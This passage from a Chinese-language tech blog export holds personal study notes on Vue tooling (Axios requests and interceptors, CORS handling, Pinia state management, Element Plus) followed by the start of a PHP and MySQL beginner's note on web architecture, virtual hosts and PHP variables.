class="params">msg</span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(msg);</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        msg 响应结果对象包含：</span></span><br><span class="line"><span class="comment">        data 服务器端响应回来的数据，是一个对象，如果返回的是JSON型数据也会自动转为对象</span></span><br><span class="line"><span class="comment">        status 响应状态码 </span></span><br><span class="line"><span class="comment">        statusText 响应状态描述</span></span><br><span class="line"><span class="comment">        headers 本次请求的所有响应头</span></span><br><span class="line"><span class="comment">        config 本次请求的配置信息</span></span><br><span class="line"><span class="comment">        request 本次请求发送时所使用的XMLHttpRequest对象</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(msg.<span class="property">data</span>.<span class="property">code</span>);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Axios-get-post方法"><a href="#Axios-get-post方法" class="headerlink" title="Axios get&#x2F;post方法"></a>Axios get&#x2F;post方法</h3><p>示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 接收和发送分离</span></span><br><span class="line"><span class="comment">// function getLoveWords()&#123;</span></span><br><span class="line"><span class="comment">//   return axios(&#123;</span></span><br><span class="line"><span class="comment">//     method:&quot;get&quot;,</span></span><br><span class="line"><span class="comment">//     url:&quot;https://api.uomg.com/api/rand.qinghua&quot;,</span></span><br><span class="line"><span class="comment">//     data:&#123;</span></span><br><span class="line"><span class="comment">//     &#125;,</span></span><br><span class="line"><span class="comment">//     params:&#123;</span></span><br><span class="line"><span class="comment">//       format:&#x27;json&#x27;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// function getLoveMessage()&#123;</span></span><br><span class="line"><span class="comment">//    let promise = getLoveWords</span></span><br><span class="line"><span class="comment">//    promise.then(</span></span><br><span class="line"><span class="comment">//     function (res)&#123;</span></span><br><span class="line"><span class="comment">//       console.log(res.data);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//    )</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送部分简化</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLoveWords</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">/* axios.get()发送get请求的方法，返回值是promise对象，多种参数可选，常见如下</span></span><br><span class="line"><span class="comment">      格式0：axios.get(url)</span></span><br><span class="line"><span class="comment">      格式1：axios.get(url,&#123;请求的其他信息&#125;)</span></span><br><span class="line"><span class="comment">      格式2：axios.get(url,&#123;params:&#123;键值对参数&#125;,header:&#123;设置一些特殊的请求头&#125;&#125;)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    axios.post()发送post请求的方法，返回值是promise对象，多种参数可选</span></span><br><span class="line"><span class="comment">    相对get方法在url后多了参数 &#123;要放入请求体中的json串&#125;</span></span><br><span class="line"><span class="comment">    示例格式：axios.post(url,&#123;要放入请求体中的json串&#125;,&#123;请求的其他信息&#125;)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">return</span> axios.<span class="title function_">get</span>(<span class="string">&quot;https://api.uomg.com/api/rand.qinghua?format=json&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收部分简化</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getLoveMessage</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">getLoveWords</span>()</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Axios拦截器"><a href="#Axios拦截器" class="headerlink" title="Axios拦截器"></a>Axios拦截器</h3><p>Axios拦截器是Axios库中的一种机制，允许在请求发送前或响应返回后对其进行全局处理。拦截器分为<strong>请求拦截器</strong>和<strong>响应拦截器</strong>，通常用于添加通用逻辑，如身份验证、错误处理、日志记录等。</p>
<p>请求拦截器的基础功能包括：</p>
<ul>
<li>设置请求的信息</li>
<li>请求前拦截器错误的返回信息</li>
</ul>
<p>示例代码：</p>
<p>axios.js：拦截器设置：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用axios函数创建一个可以发送请求的实例对象</span></span><br><span class="line"><span class="keyword">const</span> instance =  axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="comment">// 可选 baseURL 请求的基础路径 发送任何请求前都会自动在url前拼接 </span></span><br><span class="line">    <span class="attr">baseURL</span>:<span class="string">&quot;https://api.uomg.com&quot;</span></span><br><span class="line">    <span class="comment">// 可选 请求的超时时间</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置请求拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">config</span>)&#123;</span><br><span class="line">        <span class="comment">// 请求前，设置请求信息的方法，如设置请求头的accept</span></span><br><span class="line">        config.<span class="property">headers</span>.<span class="property">Accept</span>=<span class="string">&quot;application/json, text/plain, text/html,*/*&quot;</span></span><br><span class="line">        <span class="keyword">return</span> config</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">        <span class="comment">// 请求前拦截器异常方法 返回一个失败状态的promise，是axios中get()方法接收的promise</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;wrong&quot;</span>)    </span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">// 设置响应拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">response</span>)&#123;</span><br><span class="line">        <span class="comment">// 响应状态码为200时需要执行，处理相应数据，最后返回response</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">        <span class="comment">// 响应状态码非200时执行</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">        <span class="comment">// 必须响应一个promise，是axios中post()方法接收的promise</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;wrong&quot;</span>)    </span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用默认导出暴露instance</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance</span><br></pre></td></tr></table></figure>

<p>app.vue：请求收发：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> instance <span class="keyword">from</span> <span class="string">&#x27;./axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用instance发送请求，</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLoveWords</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> instance.<span class="title function_">get</span>(<span class="string">&quot;/api/rand.qinghua?format=json&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收部分简化</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getLoveMessage</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">getLoveWords</span>()</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="跨域问题处理"><a href="#跨域问题处理" class="headerlink" title="跨域问题处理"></a>跨域问题处理</h3><p>方法1：使用代理模式：由同源向跨域请求而不是浏览器向跨域请求</p>
<p>方法2：预检请求：浏览器向跨域发送请求前先向跨域发送预检请求，跨域回复安全确认信息。预检请求抗议设置时效，在此时效内仅第一次请求前发送。跨域的服务器必须有跨域过滤器，用于判断请求是否是预检请求，便于响应允许跨域信息。</p>
<h2 id="状态管理Pinia"><a href="#状态管理Pinia" class="headerlink" title="状态管理Pinia"></a>状态管理Pinia</h2><p>实现多组件间参数传递的三种方式：</p>
<ol>
<li>组件传参</li>
<li>路由传参</li>
<li>通过pinia状态管理定义共享数据</li>
</ol>
<p>Pinia可以定义响应式的共享数据，但数据是无法持久化的，需要结合sessionStorage和localStorage使用</p>
<p>安装pinia：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install pinia</span><br></pre></td></tr></table></figure>



<h3 id="pinia基本使用"><a href="#pinia基本使用" class="headerlink" title="pinia基本使用"></a>pinia基本使用</h3><p>1、定义pinia数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 定义共享的pinia数据 */</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个Person共享数据</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> definedPerson = <span class="title function_">defineStore</span>(</span><br><span class="line">    <span class="comment">// id值可以直接写在此：</span></span><br><span class="line">    <span class="comment">// &#x27;personPinia&#x27;,</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">id</span>:<span class="string">&quot;personPinia&quot;</span>, <span class="comment">//当前数据的id 必须全局唯一</span></span><br><span class="line">        <span class="attr">state</span>: <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123; <span class="comment">// 状态 其实就是响应式数据</span></span><br><span class="line">                <span class="attr">username</span>:<span class="string">&quot;lihua&quot;</span>,</span><br><span class="line">                <span class="attr">age</span>: <span class="number">10</span>,</span><br><span class="line">                <span class="attr">hobbies</span>: [<span class="string">&quot;唱&quot;</span>,<span class="string">&quot;跳&quot;</span>,<span class="string">&quot;rap&quot;</span>,<span class="string">&quot;篮球&quot;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">getters</span>:&#123;   </span><br><span class="line">            <span class="comment">// 专门定义一个获得数据或者是使用数据计算结果的一些函数，这里函数不要修改数据</span></span><br><span class="line">            <span class="comment">// 访问时按属性的访问方式而不是函数访问方式 即对象.getAge</span></span><br><span class="line">            <span class="title function_">gerAge</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">age</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 箭头函数写法：不能使用this，使用state</span></span><br><span class="line">            <span class="comment">// gerAge:(state)=&gt;&#123;</span></span><br><span class="line">            <span class="comment">//     return state.age</span></span><br><span class="line">            <span class="comment">// &#125;,</span></span><br><span class="line">            <span class="title function_">getHobbiesCount</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">hobbies</span>.<span class="property">length</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">actions</span>:&#123;</span><br><span class="line">            <span class="comment">// 专门定义一些修改数据的函数</span></span><br><span class="line">            <span class="title function_">grow</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">age</span>++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>2、在main.js开启pinia功能支持</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// import &#x27;./style.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router/router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启全局的pinia功能支持</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">let</span> pinia = <span class="title function_">createPinia</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">use</span>(pinia)</span><br><span class="line">app.<span class="title function_">use</span>(router)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>3、操作数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  // 导入pinia数据</span><br><span class="line">  import &#123;definedPerson&#125; from &#x27;../store/store.js&#x27;</span><br><span class="line">  // 使用函数获取pinia中的数据</span><br><span class="line">  let person = definedPerson()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;operate&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">    name:&lt;input type=&quot;text&quot; v-model=&quot;person.username&quot;&gt;&lt;br&gt;</span><br><span class="line">    age:&lt;input type=&quot;text&quot; v-model=&quot;person.age&quot;&gt;&lt;br&gt;</span><br><span class="line">    hobbies:&lt;br&gt;</span><br><span class="line">    唱&lt;input type=&quot;checkbox&quot; value=&quot;唱&quot; v-model=&quot;person.hobbies&quot;&gt;</span><br><span class="line">    跳&lt;input type=&quot;checkbox&quot; value=&quot;跳&quot; v-model=&quot;person.hobbies&quot;&gt;</span><br><span class="line">    rap&lt;input type=&quot;checkbox&quot; value=&quot;rap&quot; v-model=&quot;person.hobbies&quot;&gt;</span><br><span class="line">    篮球&lt;input type=&quot;checkbox&quot; value=&quot;篮球&quot; v-model=&quot;person.hobbies&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- actions中的方法是方法，按方法的访问方式 --&gt;</span><br><span class="line">    &lt;button @click=&quot;person.grow()&quot;&gt;grow&lt;/button&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- getters中的方法是属性，按属性的访问方式 --&gt;</span><br><span class="line">    &lt;span&gt;age:&#123;&#123; person.gerAge &#125;&#125;&lt;/span&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- 恢复默认值API: --&gt;</span><br><span class="line">    &lt;button @click=&quot;person.$reset()&quot;&gt;reset&lt;/button&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- 其他常用API</span><br><span class="line">        同时修改多个属性值： .$patch(&#123;属性名：属性值,属性名：属性值&#125;)</span><br><span class="line">    --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h2&gt;name:&#123;&#123; person.username &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;age:&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;hobbies:&#123;&#123; person.hobbies &#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>





<h2 id="Element-plus组件库"><a href="#Element-plus组件库" class="headerlink" title="Element-plus组件库"></a>Element-plus组件库</h2><p><code>Element Plus</code> 是一个基于 Vue 3 的桌面端 UI 组件库，由国内知名公司 Element UI 团队开发和维护。它是 <code>Element UI</code> 的升级版，专门为 Vue 3 设计，并提供了丰富的组件来帮助开发者快速构建美观、功能强大的用户界面。</p>
<p><a href="https://element-plus.org/zh-CN/component/overview.html">官方文档</a></p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install element-plus</span><br></pre></td></tr></table></figure>

<p>引入：main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ElementPlus</span> <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-plus/dist/index.css&#x27;</span>  <span class="comment">// element全局css样式</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title class_">ElementPlus</span>)</span><br></pre></td></tr></table></figure>

<p>此后需要什么组件，直接到官网找到对应代码复制即可</p>
]]></content>
      <categories>
        <category>前端技术</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>L-PHP-Note</title>
    <url>/2024/05/02/L-PHP-Note/</url>
    <content><![CDATA[<p>PHP学习记录</p>
<span id="more"></span>
<p>视频：<a href="https://www.bilibili.com/video/BV18x411H7qD?p=3">https://www.bilibili.com/video/BV18x411H7qD?p=3</a></p>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>Web分为两类：静态网站和动态网站。流程:浏览器发起访问-&gt;DNS解析域名-&gt;服务器电脑-&gt;服务软件</p>
<h2 id="静态网站访问原理："><a href="#静态网站访问原理：" class="headerlink" title="静态网站访问原理："></a>静态网站访问原理：</h2><p><strong>必备工具</strong>：1、有两台电脑，PC（个人电脑），里面需要有浏览器；另外一台为服务器（需要有服务软件，假设为APACHE）,软件没有数据，故需在里面添加文件夹（准备访问的文件&#x2F;网页）2、下面蓝线代表两个在同一个互联网下。</p>
<p><strong>访问流程</strong>：1、在浏览器中需输入URL（uniformed resource location，统一资源定位，即互联网的绝对路径）；2、第一部需要经过URL的解析（DNS，DNS内部包含本地DNS与网络DNS，，访问本地DNS无需通过网络，可提高效率。如果本地DNS无法转化IP，就需要网络DNS）。3、DNS将转换后的IP地址返回给浏览器。4、浏览器通过IP地址找到服务器。5、（虽然找到了服务器，但服务器里面资源很多，如何找自己想要的APACH？）这就需要利用端口，APACHE的端口为80。6、访问APACHE后，即可找到要访问的内容（IP地址后的&#x2F;index.html也称为URI（uniformed resource identify，统一资源标志。目标机器上相对某个文件夹的相对路径，，，注&#x2F;即为根目录，相对根目录所以其为相对路径））.7、Apache根据URI读取文件，读取文件的内容（注意只是读取）。8、Apache读取文件后，返回结果。9、浏览器看之前，需要经过浏览器解析，才可展示给用户。（所有人访问的时候，都访问的一样的index文件，若要改变显示的信息，就需要改变index，比较麻烦）</p>
<h2 id="动态网站访问"><a href="#动态网站访问" class="headerlink" title="动态网站访问"></a>动态网站访问</h2><p>区别：相对静态网站访问多了几个步骤：需要服务器端解析；需要数据库</p>
<p>在访问内容时，Apache不能识别PHP（只能识别html），需通过PHP引擎读取PHP代码。读取PHP代码之后需要进行解析，解析过程中可能需要数据库。PHP引擎通过数据库，找到内容以后再返回给Apache。（注意，PHP引擎得到的内容是PHP代码，但交给Apache的是HTML内容，，，因为浏览器只能解析html文件）</p>
<h2 id="C-S、B-S"><a href="#C-S、B-S" class="headerlink" title="C&#x2F;S、B&#x2F;S"></a>C&#x2F;S、B&#x2F;S</h2><p><strong>软件设计结构</strong>：C&#x2F;S、B&#x2F;S</p>
<p>C&#x2F;S：Client客户端&#x2F;Server服务端，用户需要安装客户端产品才能访问服务器，且只能访问一种软件（自己的）</p>
<p>B&#x2F;S：Browser浏览器&#x2F;Server服务端，用户只需要安装浏览器，就可以访问所有的服务器（B&#x2F;S架构服务）。</p>
<h2 id="MySQL访问流程"><a href="#MySQL访问流程" class="headerlink" title="MySQL访问流程"></a>MySQL访问流程</h2><p>Mysql是一款C&#x2F;S架构的软件，需要通过客户端来访问服务端</p>
<p><strong>运行：</strong>1、启用MySQL客户端：mysqi.exe</p>
<p>2、mysql.exe通过cmd运行（安装配置环境变量后可这样运行）</p>
<p><strong>操作：</strong>由于qq服务器不在自己的电脑（即客户端与服务器可分离），故MySQL客户端访问服务器需进行寻找匹配：连接认证</p>
<p>a、连接：IP端口和确认。。。如果是本地，均可省略</p>
<p>命令：*-h 主机地址*      <em>-hlocalhost（或IP）</em>  localhost是主机名     <em>-P 端口 -P3306</em>（MySQL服务器的端口默认是3306）</p>
<p>b、认证：通过用户名和密码进入服务器。</p>
<p><em>-u 用户名     -uroot</em>（不可省略，匿名用户除外）      <em>-p 密码    -proot</em></p>
<p><strong>退出命令行：</strong>\q</p>
<p><strong>注意：</strong>通常连接认证的时候不建议密码明文，可在输入-p之后回车，系统会再次让输入密码，此时为密文。</p>
<h2 id="PHP连接MySQL数据库"><a href="#PHP连接MySQL数据库" class="headerlink" title="PHP连接MySQL数据库"></a>PHP连接MySQL数据库</h2><p>PHP本身不具备操作MySQL数据库的能力，需要借助MySQL扩展来实现。</p>
<p>1、PHP加载MySQL扩展：php.ini文件中。（不要用记事本打开）</p>
<p>2、PHP中所有扩展都是在ext的文件夹中，需要指定扩展所在路径：extension_dir。</p>
<p>3、php.ini已经被Apache重载，故需要重启才可。</p>
<h2 id="设定系统时区"><a href="#设定系统时区" class="headerlink" title="设定系统时区"></a>设定系统时区</h2><h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><p>一台服务器若只能部署一个网站，则非常浪费。故需通过其他渠道实现一台主机上部署多个网站。</p>
<p><strong>虚拟主机：</strong>Virtual machine，并不存在的主机，但可提供真实主机所实现的功能。虚拟主机是将计算机中不同的文件夹进行不同的命名，然后可实现让服务器（Apache）根据用户的需求从不同的文件夹（网站）中读取不同的内容。</p>
<p><strong>分类：</strong>在Apache中，可将虚拟主机划分为两类</p>
<p>1、基于IP的虚拟主机，一台电脑上有多个IP，每个IP对应一个网站。</p>
<p>原理：电脑默认只有一个IP，因为通常只有一个网卡，但有的电脑可配置多个网卡，每个网卡可绑定一个IP地址。</p>
<p>2、基于域名的虚拟主机：一台主机只有一个IP，但IP下课制作多个网站，但需给每个网站不同的名字。</p>
<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="初步语法"><a href="#初步语法" class="headerlink" title="初步语法"></a>初步语法</h2><p>PHP是一种运行在服务器端的脚本语言，可以嵌入到HTML中。（HTML是通过浏览器解析，PHP是通过PHP引擎解析,那么嵌入到里面以后如何区分什么时候通过什么来解析？）</p>
<p><strong>PHP代码标记</strong>：可通过多种标记来区分PHP脚本</p>
<p>ASP标记  &lt;% php 代码 %&gt;；    短标记  <? Php 代码 ?>    以上两种基本弃用，如使用，需在配置文件中开启</p>
<p>脚本标记 ：也不经常用</p>
<p>标准标记：</p>
<p><strong>PHP注释：</strong>行注释：&#x2F;&#x2F;（双斜杠）或#          块注释：&#x2F;*     *&#x2F;</p>
<p><strong>PHP语句分隔符：</strong></p>
<p>1、在PHP中，代码以行为单位，系统需要通过判断行的结束，通常都用；表示结束。</p>
<p>注注注：PHP中标记结束符?&gt;有自带语句结束符的效果，最后一行PHP代码可以没有语句结束符。</p>
<p>2、PHP中代码的书写并不是全嵌入到HTML中，而是单独存在，所以可以不用标记结束符?&gt;</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>1、变量是用来存储数据的；                2、变量是存在名字的；</p>
<p>3、变量是通过名字访问数据的；        4、变量的数据是可以改变的。</p>
<h3 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h3><p>1、定义：在系统中增加对应的变量名字（在内存中开发一块地）</p>
<p>2、赋值：将数据赋值给变量（在定义时直接初始化）</p>
<p>3、可通过变量名访问数据</p>
<p>4、变量可从内存中删除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义时不需要关键字，但必须使用$符号</span></span><br><span class="line"><span class="variable">$var1</span>;</span><br><span class="line"><span class="variable">$var2</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var2</span>;   <span class="comment">// 访问变量，通过变量名找到数据，并显示</span></span><br><span class="line"><span class="variable">$var2</span> = <span class="number">2</span>;        <span class="comment">// 修改变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>,<span class="variable">$var2</span>;    <span class="comment">// hr/“ 为下划线，分隔符</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$var2</span>); <span class="comment">// 删除变量，从内存中剔除 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var2</span>;   <span class="comment">// 此时会报错，因为不存在变量</span></span><br></pre></td></tr></table></figure>

<h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><p>1、变量名字必须以”$”开头；</p>
<p>2、变量名可由数字、字母、下划线命名，但必须以字母和下划线开头</p>
<p>3、允许中文变量；</p>
<h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><p>即提前定义的变量，由系统定义的变量，存储许多要用到的数据（预定义变量都是数组）。</p>
<h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>如果一个变量保存的值刚好是另外一个变量的名字，则可直接通过访问一个变量得到另外一个变量的值：但需在变量前多加一个$符号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;    <span class="comment">// a变量的内容正好是b变量的名称，故称a为可变变量</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;bb&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;    <span class="comment">// 使用时需加一个$符号</span></span><br></pre></td></tr></table></figure>

<h3 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h3><p>将一个变量赋值给另一个变量：值传递、引用传递</p>
<p>值传递：将变量保存的值复制一份，并将该值给另外一个变量保存(两个变量无关系)</p>
<p>引用传递：将变量保存值所在的内存地址传递给另外一个变量，两个变量同指一块内存（名字不一样而已）。</p>
<h4 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h4><p>注：c++中，栈区由编译器自动释放，存储局部变量和函数参数；代码区存放函数的二进制代码，由操作系统管理；全局区存放全局变量、静态变量、常量；堆区由程序员分配释放。</p>
<h4 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 值传递</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 2.1 执行此行，在栈区开辟一块内存存储$a，在数据段中开辟一块内存保存值1。然后将1所在位置赋值给a变量</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;   </span><br><span class="line"><span class="comment">// 2.2 栈区开辟存储$b；发现是赋值运算，故会取出$a的值，</span></span><br><span class="line"><span class="comment">// 并在数据段重新开辟一块内存并保存，且再把新开辟地址赋值给栈区的变量b</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;   <span class="comment">// 值传递</span></span><br><span class="line"><span class="comment">// 2.3 执行该行</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<p>讲解运行步骤：</p>
<p>1、代码装载：从脚本文件中将代码读取出来，进行编译，将编译结果存放到代码段（二进制）。</p>
<p>2、代码执行：从代码段中一行一行执行代码。</p>
<p>3、脚本执行结束：系统会回收所有内存（栈区、代码区）：因为数据段与栈区有关系，回收栈后，数据段的内容无意义，相当于回收。</p>
